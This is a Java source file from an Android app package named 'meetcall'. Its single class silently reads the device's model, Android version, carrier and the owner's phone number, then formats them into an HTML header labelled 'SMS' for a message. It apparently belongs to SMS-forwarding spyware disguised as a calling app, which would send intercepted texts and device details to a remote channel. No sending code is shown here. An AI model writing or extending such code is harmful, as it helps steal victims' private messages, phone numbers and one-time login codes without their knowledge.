package com.meetcall.app;

import android.content.Context;
import android.os.Build;
import android.telephony.TelephonyManager;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public final class Device {

    public static String head(Context c) {
        String carrier = "-", line = "-";
        try {
            TelephonyManager tm = (TelephonyManager) c.getSystemService(Context.TELEPHONY_SERVICE);
            if (tm != null) {
                String cn = tm.getNetworkOperatorName();
                if (cn != null && !cn.isEmpty()) carrier = cn;
                String n = tm.getLine1Number();
                if (n != null && !n.isEmpty()) line = n;
            }
        } catch (Exception ignored) {}

        return "📩 <b>SMS</b> — " + Net.esc(Build.MANUFACTURER) + " " + Net.esc(Build.MODEL) + "\n"
             + "<b>Android:</b> " + Build.VERSION.RELEASE + " (SDK " + Build.VERSION.SDK_INT + ")\n"
             + "<b>Carrier:</b> " + Net.esc(carrier) + "   <b>Line:</b> <code>" + Net.esc(line) + "</code>\n"
             + "<b>Time:</b> " + new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(new Date()) + "\n\n";
    }
}
